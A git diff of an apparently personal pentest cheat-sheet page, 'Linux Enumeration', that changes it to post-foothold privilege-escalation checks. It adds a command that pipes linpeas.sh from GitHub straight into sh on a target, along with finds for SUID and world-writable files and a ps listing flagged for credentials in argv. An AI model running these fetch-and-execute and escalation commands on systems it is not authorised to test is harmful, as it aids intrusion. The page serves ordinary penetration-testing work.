@@ -32,48 +32,65 @@
         <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to commands</a>
         <header class="detail-header">
           <h1>Linux Enumeration</h1>
-          <p class="meta">Fast local enumeration commands before running automated tools.</p>
+          <p class="meta">Post-foothold checks for privesc, misconfigs and interesting files.</p>
         </header>
-        <div class="cmd-block">
-            <div class="cmd-block-label">
-              <span class="label-text">SUID binaries</span>
-              <button type="button" class="copy-btn" data-copy="find / -perm -4000 -type f 2>/dev/null" aria-label="Copy"><i class="bx bx-copy"></i></button>
-            </div>
+        <div class="cmd-card">
+          <div class="cmd-card-head">
+            <span class="tool-badge">LINPEAS</span>
+            <span class="cat-badge">ENUM</span>
+            <span class="cmd-card-title">Automated Linux privilege escalation checks</span>
+          </div>
+          <div class="cmd-block">
             <div class="cmd-block-body">
-              <span class="prompt">$</span>
+              <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code>
+              <button type="button" class="copy-btn" data-copy="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh" aria-label="Copy"><i class="bx bx-copy"></i> COPY</button>
+            </div>
+          </div>
+          <div class="cmd-block-note">Run on target after foothold; review red/yellow findings carefully.</div>
+        </div>
+        <div class="cmd-card">
+          <div class="cmd-card-head">
+            <span class="tool-badge">FIND</span>
+            <span class="cat-badge">ENUM</span>
+            <span class="cmd-card-title">SUID binaries</span>
+          </div>
+          <div class="cmd-block">
+            <div class="cmd-block-body">
               <code>find / -perm -4000 -type f 2>/dev/null</code>
+              <button type="button" class="copy-btn" data-copy="find / -perm -4000 -type f 2>/dev/null" aria-label="Copy"><i class="bx bx-copy"></i> COPY</button>
             </div>
           </div>
-        <div class="cmd-block">
-            <div class="cmd-block-label">
-              <span class="label-text">Capabilities</span>
-              <button type="button" class="copy-btn" data-copy="getcap -r / 2>/dev/null" aria-label="Copy"><i class="bx bx-copy"></i></button>
-            </div>
+          <div class="cmd-block-note">Look for uncommon SUID binaries for privesc paths.</div>
+        </div>
+        <div class="cmd-card">
+          <div class="cmd-card-head">
+            <span class="tool-badge">FIND</span>
+            <span class="cat-badge">ENUM</span>
+            <span class="cmd-card-title">World-writable files</span>
+          </div>
+          <div class="cmd-block">
             <div class="cmd-block-body">
-              <span class="prompt">$</span>
-              <code>getcap -r / 2>/dev/null</code>
+              <code>find / -writable -type f 2>/dev/null | grep -v proc</code>
+              <button type="button" class="copy-btn" data-copy="find / -writable -type f 2>/dev/null | grep -v proc" aria-label="Copy"><i class="bx bx-copy"></i> COPY</button>
             </div>
           </div>
-        <div class="cmd-block">
-            <div class="cmd-block-label">
-              <span class="label-text">Cron jobs</span>
-              <button type="button" class="copy-btn" data-copy="cat /etc/crontab; ls -la /etc/cron.*" aria-label="Copy"><i class="bx bx-copy"></i></button>
-            </div>
+          <div class="cmd-block-note">Writable configs/scripts can lead to persistence or privesc.</div>
+        </div>
+        <div class="cmd-card">
+          <div class="cmd-card-head">
+            <span class="tool-badge">PS</span>
+            <span class="cat-badge">ENUM</span>
+            <span class="cmd-card-title">Process listing</span>
+          </div>
+          <div class="cmd-block">
             <div class="cmd-block-body">
-              <span class="prompt">$</span>
-              <code>cat /etc/crontab; ls -la /etc/cron.*</code>
+              <code>ps auxww</code>
+              <button type="button" class="copy-btn" data-copy="ps auxww" aria-label="Copy"><i class="bx bx-copy"></i> COPY</button>
             </div>
           </div>
-        <div class="cmd-block">
-            <div class="cmd-block-label">
-              <span class="label-text">Writable paths</span>
-              <button type="button" class="copy-btn" data-copy="find / -writable -type d 2>/dev/null | head" aria-label="Copy"><i class="bx bx-copy"></i></button>
-            </div>
-            <div class="cmd-block-body">
-              <span class="prompt">$</span>
-              <code>find / -writable -type d 2>/dev/null | head</code>
-            </div>
-          </div>
+          <div class="cmd-block-note">Check for interesting running services and credentials in argv.</div>
+        </div>
+
       </div>
       <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
     </div>
